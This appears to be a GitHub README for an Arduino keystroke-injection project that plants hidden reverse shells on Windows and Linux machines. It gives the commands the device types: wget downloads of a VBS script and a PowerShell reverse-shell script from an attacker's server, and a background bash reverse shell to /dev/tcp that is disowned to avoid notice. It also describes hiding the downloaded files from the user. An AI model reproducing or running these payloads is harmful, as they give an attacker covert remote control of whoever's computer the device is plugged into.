# Reverse Shell Arduino
## Hidden reverse shells with arduino

# How to start   
• To use in Windows, make local http server with python:
  ```
  python -m http.server 80
  ```    

edit file reverse_shell_win.ino and specify address to file:
  ```
  //set address to ur reverse shell file and vbs file
  delay(1000);
  Keyboard.println("wget \"http://<address_to_your_file>/hidden.vbs\" -outfile \"C:\\hidden.vbs\"");
  delay(1000);
  Keyboard.println("wget \"http://<address_to_your_file>/rev.ps1\" -outfile \"C:\\rev.ps1\"");
  ``` 

edit rev.ps1 file and specify ip and port of your machine from which you will use reverse shell:
  ``` 
  $LHOST = "IP"; $LPORT = <PORT>;
  ``` 

• To use in Linux just edit file reverse_shell_win.ino and specify ip and port of your machine:  
  ```
  Keyboard.println("nohup /bin/bash -c \"/bin/bash -i >& /dev/tcp/<IP>/<PORT> 0>&1\" >/dev/null 2>&1 &; disown; exit");
  ``` 
# Examples
After connecting the arduino to a windows machine, the necessary files are downloaded and the hidden attribute is set to them so that they are not visible:   

![hidden_files](https://github.com/EvtDanya/Reverse-Shell-Arduino/blob/main/hidden_files.png)  

And our reverse shell is launched:       

![reverse_shell_in_windows](https://github.com/EvtDanya/Reverse-Shell-Arduino/blob/main/reverse_win.png)      

After connecting the arduino to a linux machine, a command is run in the background and it can now be detected only through the list of system processes:  

![reverse_shell_in_linux](https://github.com/EvtDanya/Reverse-Shell-Arduino/blob/main/reverse_lin.png)  

## Feedback  
If you have any questions or suggestions, please dm me https://t.me/d3f3nd3r